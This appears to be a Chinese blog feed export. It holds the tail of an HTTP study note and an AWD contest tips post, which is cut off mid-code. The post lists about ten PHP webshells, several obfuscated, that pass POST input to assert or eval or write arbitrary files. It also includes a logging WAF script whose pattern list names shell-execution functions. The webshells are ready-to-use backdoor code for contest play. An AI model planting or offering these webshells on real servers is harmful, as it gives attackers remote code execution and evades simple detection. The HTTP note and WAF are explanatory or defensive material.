是一个在计算机世界里专门在「两点」之间「传输」文字、图片、音频、视频 等「超文本」数据的「约定和规范」</p><p>URL（统一资源定位符）：我们常说的网址，包含了用于查找资源的足够的信息，而 一个完整的URL包含下面几部分</p><p> protocol:[&#x2F;&#x2F;[user[:password]@]host[:port]][&#x2F;path][?query] [#fragment]</p><p><strong>protocol</strong>：指定使用的传输协议，最常见的协议是 <strong>HTTP&#x2F;HTTPS</strong>，用于定位网络资源。其他协议包括：</p><ul><li><strong>mailto:</strong> 打开邮箱客户端</li><li><strong>ftp:</strong> 用于文件传输</li><li><strong>file:</strong> 获取本地或共享文件</li></ul><p><strong>user</strong>用于在需要认证后才能访问的资源时提供账号和密码。</p><p><strong>host</strong>：指定合法的互联网主机域名或 IP 地址，表示资源所在的服务器位置。</p><p><strong>port</strong>：用于指定在传输层上用于信息交换的进程端口号，表示获取服务器资源的入口。</p><ul><li>不同协议有默认端口号，例如 HTTP 的默认端口是 80。若使用其他端口，则需要显式指定。</li></ul><p><strong>path</strong>：表示服务器上资源的具体路径，指明请求的资源位置。</p><p><strong>?query</strong>：可选项，用于传递动态网页参数。</p><ul><li>多个参数之间用 <strong>“&amp;”</strong> 隔开，每个参数的键值对之间用 <strong>“&#x3D;”</strong> 隔开。</li></ul><p><strong>#fragment</strong>：信息片段字符串，用于指定资源中的某个部分。</p><ul><li>例如，在网页中可以用 fragment 直接定位到特定的段落或名词解释位置。</li></ul><h3 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h3><p>HTTP请求由四个部分组成： 请求行 请求头部 空行 请求正</p><p>![image-20241114210646570](F:\new myblog\STUDY\source\img\image-20241114210646570.png)</p><p>![image-20241114210708742](F:\new myblog\STUDY\source\img\image-20241114210708742.png)</p><p>请求方法</p><h3 id="HTTP-请求方法"><a href="#HTTP-请求方法" class="headerlink" title="HTTP 请求方法"></a>HTTP 请求方法</h3><ol><li><strong>GET</strong>：获取由 <code>Request-URI</code> 所标识的资源。</li><li><strong>POST</strong>：在 <code>Request-URI</code> 所标识的资源后附加新的数据。</li><li><strong>HEAD</strong>：请求获取由 <code>Request-URI</code> 所标识的资源的响应消息报头，不返回主体内容。</li><li><strong>PUT</strong>：请求服务器存储一个资源，并使用 <code>Request-URI</code> 作为该资源的标识。</li><li><strong>DELETE</strong>：请求服务器删除 <code>Request-URI</code> 所标识的资源。</li><li><strong>TRACE</strong>：请求服务器回送收到的请求信息，主要用于测试或诊断。</li><li><strong>OPTIONS</strong>：请求查询服务器的性能，或者获取与资源相关的选项和需求。</li><li><strong>CONNECT</strong>：保留给将来使用，在 HTTP&#x2F;1.1 协议中为代理服务器预留，以便能够将连接改为管道方式。</li><li><strong>PATCH</strong>：用于将局部修改应用到资源（由 RFC 5789 指定的方法）。</li></ol><p><strong>HTTP&#x2F;1.0</strong> 定义了三种请求方法：<code>GET</code>、<code>POST</code> 和 <code>HEAD</code>。</p><p><strong>HTTP&#x2F;1.1</strong> 新增了六种请求方法：<code>OPTIONS</code>、<code>PUT</code>、<code>PATCH</code>、<code>DELETE</code>、<code>TRACE</code> 和 <code>CONNECT</code>。</p><p>![image-20241114210859708](F:\new myblog\STUDY\source\img\image-20241114210859708.png)</p><p>状态码 </p><p>以下是您关于 HTTP 状态码的内容排版整理：</p><hr><h3 id="HTTP-状态码详解"><a href="#HTTP-状态码详解" class="headerlink" title="HTTP 状态码详解"></a>HTTP 状态码详解</h3><h4 id="2xx：成功状态码"><a href="#2xx：成功状态码" class="headerlink" title="2xx：成功状态码"></a>2xx：成功状态码</h4><ul><li><strong>200 OK</strong>：表示请求成功，一切正常。响应头包含 <code>body</code> 数据。</li><li><strong>204 No Content</strong>：请求成功，但响应头没有 <code>body</code> 数据。</li><li><strong>206 Partial Content</strong>：表示分块下载或断点续传，<code>body</code> 数据是资源的一部分，服务器处理成功。</li></ul><hr><h4 id="3xx：重定向状态码"><a href="#3xx：重定向状态码" class="headerlink" title="3xx：重定向状态码"></a>3xx：重定向状态码</h4><ul><li><strong>301 Moved Permanently</strong>：永久重定向，资源已移动到新的 URL，客户端需使用新的 URL。</li><li><strong>302 Found</strong>（Moved Temporarily）：临时重定向，资源暂时需要用另一个 URL 访问。<ul><li><strong>301</strong> 和 <strong>302</strong> 状态码的响应头中会使用 <code>Location</code> 字段指明跳转的 URL，浏览器会自动重定向。</li></ul></li><li><strong>304 Not Modified</strong>：资源未修改，重定向到客户端已有的缓存文件，通常用于缓存控制。</li></ul><hr><h4 id="4xx：客户端错误状态码"><a href="#4xx：客户端错误状态码" class="headerlink" title="4xx：客户端错误状态码"></a>4xx：客户端错误状态码</h4><ul><li><strong>400 Bad Request</strong>：请求的报文有错误，属于笼统的错误码。</li><li><strong>403 Forbidden</strong>：服务器禁止访问资源，与客户端请求无关。</li><li><strong>404 Not Found</strong>：请求的资源不存在或未找到，服务器无法提供资源。</li></ul><hr><h4 id="5xx：服务器错误状态码"><a href="#5xx：服务器错误状态码" class="headerlink" title="5xx：服务器错误状态码"></a>5xx：服务器错误状态码</h4><ul><li><strong>500 Internal Server Error</strong>：服务器内部错误，属于笼统的通用错误码。</li><li><strong>501 Not Implemented</strong>：服务器不支持请求的功能，相当于“即将开业，敬请期待”。</li><li><strong>502 Bad Gateway</strong>：服务器作为网关或代理时访问后端服务器出错。</li><li><strong>503 Service Unavailable</strong>：服务器暂时无法响应请求，通常表示服务器繁忙，请稍后重试。</li></ul><hr><h3 id="HTTP请求方法理解"><a href="#HTTP请求方法理解" class="headerlink" title="HTTP请求方法理解"></a>HTTP请求方法理解</h3><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p>Get 方法的含义是请求从服务器获取资源，这个资源可以是静态的文本、页面、图 片视频等</p><p>![image-20241114211249857](F:\new myblog\STUDY\source\img\image-20241114211249857.png)</p><h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><p>POST：向 Request-URI所标识的资源提交数据，数据就放在请求正文中 用于向指定资源发送数据，指定的资源会对数据进行处理，然后将处理结果返回给客 户端，一般用于表单提交、文件上传</p><p>![image-20241114211204865](F:\new myblog\STUDY\source\img\image-20241114211204865.png)</p><h4 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h4><p>HEAD：请求获取由Request-URI所标识的资源的响应消息报头首部，不会返回报文 主体</p><p>![image-20241114211328505](F:\new myblog\STUDY\source\img\image-20241114211328505.png)</p><h4 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><p>OPTIONS：查询资源支持的方法</p><p>![image-20241114211353396](F:\new myblog\STUDY\source\img\image-20241114211353396.png)</p><h4 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h4><p><code>PUT</code> 请求用于向服务器存储一个资源，并使用 <code>Request-URI</code> 作为其标识。服务器会将请求主体的内容保存到 <code>URL</code> 指定的资源位置，包含以下两种情况：</p><ol><li><strong>资源不存在</strong>：<ul><li>如果 <code>URL</code> 指定的资源不存在，服务器会新建一个文件，将请求主体中的内容保存到新建的文件中。</li><li><strong>响应码</strong>：<code>201 Created</code></li></ul></li><li><strong>资源已存在</strong>：<ul><li>如果 <code>URL</code> 指定的资源已存在，服务器会用请求主体中的内容<strong>覆盖原文件内容</strong>。</li><li><strong>响应码</strong>：<code>200 OK</code> 或 <code>204 No Content</code></li></ul></li></ol><p>![image-20241114211421629](F:\new myblog\STUDY\source\img\image-20241114211421629.png)</p><h4 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h4><p>DELETE：请求服务器删除Request-URI所标识的资源</p><p>![image-20241114211431471](F:\new myblog\STUDY\source\img\image-20241114211431471.png)</p><h4 id="TRACE"><a href="#TRACE" class="headerlink" title="TRACE"></a>TRACE</h4><p>TRACE：路径追踪，请求服务器回送收到的请求信息，主要用于测试或诊断发送的请 求是否在客户端与服务端之间传送时被网关、防火墙、代理更改</p><h3 id="HTTPS与HTTP"><a href="#HTTPS与HTTP" class="headerlink" title="HTTPS与HTTP"></a>HTTPS与HTTP</h3><p>HTTP 与 HTTPS 的区别</p><ol><li><strong>传输安全性</strong>：<ul><li><strong>HTTP</strong>：超文本传输协议，信息<strong>以明文形式传输</strong>，存在安全风险。</li><li><strong>HTTPS</strong>：在 TCP 和 HTTP 网络层之间加入 <strong>SSL&#x2F;TLS</strong> 安全协议，使得报文可以<strong>加密传输</strong>，解决了 HTTP 的不安全问题。</li></ul></li><li><strong>连接建立流程</strong>：<ul><li><strong>HTTP</strong>：建立相对简单，经过 TCP 三次握手后即可传输 HTTP 报文。</li><li><strong>HTTPS</strong>：在 TCP 三次握手之后，还需进行<strong>SSL&#x2F;TLS 握手</strong>过程，才可进入加密的报文传输。</li></ul></li><li><strong>端口号</strong>：<ul><li><strong>HTTP</strong>：默认端口号为 80。</li><li><strong>HTTPS</strong>：默认端口号为 443。</li></ul></li><li><strong>证书验证</strong>：<ul><li><strong>HTTPS</strong>：需要向 <strong>CA（证书权威机构）</strong> 申请数字证书，以保证服务器身份的可信度。</li></ul></li></ol><hr><p>HTTPS 解决的问题</p><p>由于 HTTP 是明文传输，在安全性上存在以下三个主要风险：</p><ol><li><strong>窃听风险</strong>：第三方可以在通信链路中获取通信内容，导致用户隐私泄露。</li><li><strong>篡改风险</strong>：第三方可以强制插入内容（如垃圾广告），影响用户体验和内容完整性。</li><li><strong>冒充风险</strong>：第三方可以冒充合法网站（如银行或购物网站），引诱用户输入敏感信息，从而盗取用户财产。</li></ol><p>![image-20241114211604169](F:\new myblog\STUDY\source\img\image-20241114211604169.png)</p><p>- </p><h2 id="写电子笔记真是最傻逼的事情了，这种要记忆的用笔记啊"><a href="#写电子笔记真是最傻逼的事情了，这种要记忆的用笔记啊" class="headerlink" title="写电子笔记真是最傻逼的事情了，这种要记忆的用笔记啊"></a>写电子笔记真是最傻逼的事情了，这种要记忆的用笔记啊</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>AWD姿势总结</title>
    <link href="/2024/09/28/AWD%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/"/>
    <url>/2024/09/28/AWD%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h6 id="1-准备一个webshell脚本-带密码的webshell，注释变形，字符串变形，自增变形，利用文件名，利用-htaccess"><a href="#1-准备一个webshell脚本-带密码的webshell，注释变形，字符串变形，自增变形，利用文件名，利用-htaccess" class="headerlink" title="1.准备一个webshell脚本:  带密码的webshell，注释变形，字符串变形，自增变形，利用文件名，利用.htaccess"></a>1.准备一个webshell脚本:  带密码的webshell，注释变形，字符串变形，自增变形，利用文件名，利用.htaccess</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;assert&quot;</span>;<br>@<span class="hljs-variable">$a</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;a&quot;</span>.<span class="hljs-string">&quot;s&quot;</span>.<span class="hljs-string">&quot;s&quot;</span>.<span class="hljs-string">&quot;e&quot;</span>.<span class="hljs-string">&quot;r&quot;</span>.<span class="hljs-string">&quot;t&quot;</span>; <br><span class="hljs-variable">$a</span>(<span class="hljs-variable">$_POST</span>[pass]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">substr_replace</span>(<span class="hljs-string">&quot;assexx&quot;</span>,<span class="hljs-string">&quot;rt&quot;</span>,<span class="hljs-number">4</span>);<br>@<span class="hljs-variable">$a</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;a&quot;</span>.<span class="hljs-string">&quot;s&quot;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;s&quot;</span>.<span class="hljs-string">&quot;e&quot;</span>.<span class="hljs-string">&quot;rt&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">base_decode</span>(YXNzZXJ0);<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$a</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">shyshy</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;this-&gt;<span class="hljs-subst">$a</span>&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">shyshy</span>();<br><span class="hljs-variable">$b</span>-&gt;a=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shyshy</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$a</span>);<br>&#125;<br>@<span class="hljs-title function_ invoke__">shyshy</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$b</span>.=<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$d</span>=<span class="hljs-string">&#x27;data&#x27;</span>;<br><span class="hljs-variable">$$d</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;text&#x27;</span>];  <span class="hljs-comment">//$data</span><br><span class="hljs-variable">$f</span>=<span class="hljs-string">&#x27;fp&#x27;</span>;<br><span class="hljs-variable">$$f</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-string">&#x27;wb&#x27;</span>);  <span class="hljs-comment">//$fp</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$data</span>):<span class="hljs-string">&quot;save success&quot;</span>:<span class="hljs-string">&quot;save fail&quot;</span>;<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>2.waf准备：拦截恶意payload，恶意字符串，flag输出一个假flag，记录日志</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php">只记录流量，无过滤功能<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;LOG_FILENAME&#x27;</span>, <span class="hljs-string">&#x27;log.txt&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;getallheaders&#x27;</span>)) &#123;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getallheaders</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) == <span class="hljs-string">&#x27;HTTP_&#x27;</span>) <span class="hljs-variable">$headers</span>[<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">5</span>))))) ] = <span class="hljs-variable">$value</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>;<br>    <span class="hljs-variable">$post</span> = <span class="hljs-variable">$_POST</span>;<br>    <span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_COOKIE</span>;<br>    <span class="hljs-variable">$header</span> = <span class="hljs-title function_ invoke__">getallheaders</span>();<br>    <span class="hljs-variable">$files</span> = <span class="hljs-variable">$_FILES</span>;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<br>    <span class="hljs-variable">$method</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>];<br>    <span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_NAME&quot;</span>];<br>    <span class="hljs-comment">//rewirte shell which uploaded by others, you can do more</span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-variable">$files</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&quot;virink&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$header</span>[<span class="hljs-string">&#x27;Accept&#x27;</span>]); <span class="hljs-comment">//fix a bug</span><br>    <span class="hljs-variable">$input</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;Get&quot;</span> =&gt; <span class="hljs-variable">$get</span>,<br>        <span class="hljs-string">&quot;Post&quot;</span> =&gt; <span class="hljs-variable">$post</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span> =&gt; <span class="hljs-variable">$cookie</span>,<br>        <span class="hljs-string">&quot;File&quot;</span> =&gt; <span class="hljs-variable">$files</span>,<br>        <span class="hljs-string">&quot;Header&quot;</span> =&gt; <span class="hljs-variable">$header</span><br>    );<br>    <span class="hljs-comment">//deal with</span><br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;select|insert|update|delete|and|or|\&#x27;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex&quot;</span>;<br>    <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|file_put_contents|fwrite|curl|system|eval|assert&quot;</span>;<br>    <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;<br>    <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec&quot;</span>;<br>    <span class="hljs-variable">$vpattern</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-variable">$pattern</span>);<br>    <span class="hljs-variable">$bool</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$vpattern</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$v</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$kk</span> =&gt; <span class="hljs-variable">$vv</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$value</span>/i&quot;</span>, <span class="hljs-variable">$vv</span>)) &#123;<br>                    <span class="hljs-variable">$bool</span> = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-title function_ invoke__">logging</span>(<span class="hljs-variable">$input</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$bool</span>) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$bool</span>) <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logging</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;<br><span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);<span class="hljs-comment">//修正时间为中国准确时间</span><br><span class="hljs-variable">$time</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>);<span class="hljs-comment">//将时间赋值给变量$time</span><br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(LOG_FILENAME, <span class="hljs-string">&quot;\r\n\r\n\r\n&quot;</span> . <span class="hljs-variable">$time</span> . <span class="hljs-string">&quot;\r\n&quot;</span> . <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$var</span>, <span class="hljs-literal">true</span>) , FILE_APPEND);<br>    <span class="hljs-comment">// die() or unset($_GET) or unset($_POST) or unset($_COOKIE);</span><br>    <br>&#125;<br><span class="hljs-title function_ invoke__">waf</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 